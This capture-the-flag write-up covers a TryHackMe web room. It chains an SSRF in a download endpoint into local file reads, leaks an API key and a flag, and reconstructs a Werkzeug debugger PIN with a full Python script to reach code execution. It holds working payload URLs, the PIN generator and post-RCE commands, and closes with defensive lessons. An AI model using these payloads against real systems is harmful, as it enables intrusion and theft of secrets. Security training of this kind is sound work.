# TryHackMe: Plant Photographer — Writeup

## Challenge Name
Plant Photographer

## Category
Web Exploitation

## Difficulty
Medium

## Description
A personal portfolio website for a plant photographer that lets visitors download a resume through a `/download` endpoint. The endpoint takes a `server` parameter and fetches a file from it server-side — a classic setup for **Server-Side Request Forgery (SSRF)**. Chaining that single bug through file disclosure, credential leakage, and a Werkzeug debug PIN reconstruction leads all the way to full Remote Code Execution (RCE) on the box.

The room has three flags to find:
1. An API key used to talk to a "secure file storage" backend
2. A flag hidden behind an admin panel restricted to `localhost`
3. A flag stored as a plain text file in the web directory

## Tools Used
- Web browser (DevTools → Network tab)
- `curl` / manual URL manipulation
- Werkzeug's built-in interactive debugger console (once unlocked)
- Python 3 (to reimplement Werkzeug's PIN-generation algorithm)
- `pip download` (to pull the exact vulnerable library source for verification)

## Methodology
The overall approach was:

1. **Recon** — inspect the site's source and network requests to find anything unusual.
2. **Identify the vulnerable parameter** — the resume download link passes a `server` value straight into a server-side HTTP fetch. That's SSRF.
3. **Abuse the SSRF for information disclosure** — instead of just hitting other hosts/ports, point it at `file://` URIs to read arbitrary files off the server's disk (an SSRF-to-LFI escalation).
4. **Read the application source** — with arbitrary file read, pull `app.py` directly. This immediately reveals the hardcoded API key and the admin route's access logic.
5. **Read the admin-only flag file directly** — since the admin route just checks `request.remote_addr == '127.0.0.1'`, and we already have local file read, we can skip the network check entirely and just read the flag file from disk.
6. **Escalate to full RCE** — the app runs Flask in debug mode, exposing Werkzeug's interactive debugger, which is normally protected by a PIN. Werkzeug derives that PIN deterministically from a handful of machine/app fingerprint values. Using the same file-read primitive, leak those values (MAC address, container/machine ID, app file path, running user) and recompute the PIN locally.
7. **Use the debugger console** to run arbitrary Python, `find` the last flag file on disk, and read it.

## Step-by-Step Solution

### 1. Initial recon
Loaded the site and watched the Network tab. Found a "Download Resume" link:
```
/download?server=secure-file-storage.com:8087&id=75482342
```
This told the app to reach out to an external server to fetch a file — a strong SSRF indicator, since the destination host is attacker-controlled input.

### 2. Confirming and abusing the SSRF
Redirecting `server=` to `127.0.0.1` produced a Werkzeug **debug-mode traceback** (connection refused on port 80), confirming:
- The parameter really is used server-side in an outbound request.
- Flask debug mode is **enabled** in production — a serious misconfiguration that later became the path to full RCE.

### 3. Turning SSRF into arbitrary file read
`pycurl` (used internally by the app) supports the `file://` scheme. Pointing `server=` at a local file path let us read arbitrary files on the server:
```
/download?server=file:///usr/src/app/app.py&id=75482342
```
The app builds the fetch URL by concatenating `server` + a fixed suffix path + `<id>.pdf`, so a raw `file://` path got corrupted by that appended suffix. Using a URL fragment (`#`, URL-encoded as `%23`) truncated everything appended after it, since `file://` URL parsing treats `#...` as a fragment and ignores it:
```
/download?server=file:///usr/src/app/app.py%23&id=75482342
```
This downloaded the full application source as a mislabeled `.pdf` file (its content was plain text).

### 4. Reading the source — Flags 1 & 2
The leaked `app.py` contained:
```python
crl.setopt(crl.HTTPHEADER, ['X-API-KEY: <redacted-api-key>'])
```
→ **Flag 1: the API key**, hardcoded directly in the source.

It also showed the admin route:
```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"
```
Rather than trying to spoof the source IP over the network, the same file-read primitive reads the flag file directly off disk:
```
/download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=75482342
```
→ **Flag 2: the admin flag**, extracted from the downloaded PDF (again, plain text under the wrong extension).

### 5. Escalating to RCE via the Werkzeug debug PIN
Werkzeug's debugger, when triggered by an unhandled exception in debug mode, offers an interactive Python console — but it's PIN-protected. The PIN is derived deterministically from:
- The user running the process
- The app's module name and Flask class name
- The absolute path of a specific Python source file
- The machine's MAC address
- A machine/container identifier

All of these can be leaked using the same `file://` SSRF trick:

| Value | Source file read |
|---|---|
| Running user | `/proc/self/status` (`Uid:` line → `0` → root) |
| MAC address | `/sys/class/net/eth0/address` |
| Machine/container ID | `/proc/self/cgroup` |
| Library version (to pick the right hash algorithm) | `/usr/src/app/requirements.txt` |

`requirements.txt` pinned `Werkzeug==0.16.0` — an old version, which:
- Uses **MD5** (newer Werkzeug ≥2.0 switched to SHA1)
- Computes the "machine ID" bit purely from `/proc/self/cgroup` (parsing the Docker container ID after `/docker/`) — **it does not fall back to `/etc/machine-id` or `boot_id` if the cgroup lookup already succeeded**

Reimplementing Werkzeug 0.16.0's exact `get_pin_and_cookie_name()` logic locally with the leaked values reproduced the same 9-digit PIN the server would generate, without ever brute-forcing it live.

Entering the reconstructed PIN into the debugger console unlocked full **Remote Code Execution**.

### 6. Finding the last flag — Flag 3
With arbitrary Python execution:
```python
import subprocess
print(subprocess.check_output(['find', '/', '-iname', '*flag*', '-not', '-path', '*/proc/*'], text=True, stderr=subprocess.DEVNULL))
```
This listed every "flag"-named file on disk, revealing an obfuscated filename:
```
/usr/src/app/flag-982374827648721338.txt
```
Reading it directly:
```python
print(open('/usr/src/app/flag-982374827648721338.txt').read())
```
→ **Flag 3**, retrieved.

## Commands Used
```
# Trigger the SSRF / traceback
GET /download?server=127.0.0.1:80&id=75482342

# Arbitrary file read via SSRF + file:// + fragment truncation
GET /download?server=file:///usr/src/app/app.py%23&id=75482342
GET /download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=75482342
GET /download?server=file:///proc/self/status%23&id=75482342
GET /download?server=file:///sys/class/net/eth0/address%23&id=75482342
GET /download?server=file:///proc/self/cgroup%23&id=75482342
GET /download?server=file:///usr/src/app/requirements.txt%23&id=75482342

# Local PIN reconstruction (Python, run offline)
python3 pin_generator.py

# Post-RCE, inside the Werkzeug console
import subprocess
print(subprocess.check_output(['find', '/', '-iname', '*flag*', '-not', '-path', '*/proc/*'], text=True, stderr=subprocess.DEVNULL))
print(open('/usr/src/app/flag-982374827648721338.txt').read())
```

### PIN generator (Werkzeug 0.16.0 logic)
```python
import hashlib
from itertools import chain

MODNAME = 'flask.app'
APP_NAME = 'Flask'
MOD_FILE = '/usr/local/lib/python3.10/site-packages/flask/app.py'  # leaked from traceback

MAC_ADDRESS = '<leaked MAC>'
MACHINE_ID = '<leaked docker container id from /proc/self/cgroup>'
USERNAME = 'root'  # from Uid: 0 in /proc/self/status

def compute(username):
    probably_public_bits = [username, MODNAME, APP_NAME, MOD_FILE]
    mac_int = int(MAC_ADDRESS.replace(':', ''), 16)
    private_bits = [str(mac_int), MACHINE_ID]

    h = hashlib.md5()  # Werkzeug < 2.0 uses MD5; >= 2.0 uses SHA1
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

    for group_size in (5, 4, 3):
        if len(num) % group_size == 0:
            return '-'.join(num[x:x + group_size] for x in range(0, len(num), group_size))

print(compute(USERNAME))
```

## Lessons Learned
- **SSRF is rarely "just" SSRF.** A parameter that lets the server fetch a URL of your choosing is dangerous even without direct network pivoting — if the underlying HTTP client supports alternate schemes like `file://`, SSRF quietly becomes local file disclosure.
- **URL fragments (`#`) can defeat naive path concatenation.** When an app builds a URL by appending a fixed suffix to user input, a `#` (URL-encoded as `%23`) can truncate everything after it during parsing, letting an attacker control the "effective" path exactly.
- **Never hardcode secrets in application source.** The API key sitting in plaintext in `app.py` was trivially exposed the moment file read was possible.
- **IP-based access control (`request.remote_addr == '127.0.0.1'`) is not a real security boundary** once any form of local file read or SSRF exists — the check can simply be bypassed by reading the protected resource directly off disk instead of going through the route at all.
- **Flask's debug mode must never run in production.** It doesn't just leak stack traces — it exposes an interactive code execution console, protected only by a PIN that is derived from values an attacker with file-read access can often leak and recompute offline.
- **Old, pinned dependency versions matter.** The exact Werkzeug version changed both the hash algorithm (MD5 → SHA1) and the machine-ID derivation logic entirely. Always confirm library versions (e.g., via `requirements.txt`) before assuming which algorithm variant applies.
- **Defense in depth**: any one of the following would have stopped this chain — disabling debug mode in production, validating/allow-listing the `server` parameter's scheme and host, not hardcoding API keys in source, or storing secrets outside the web root entirely.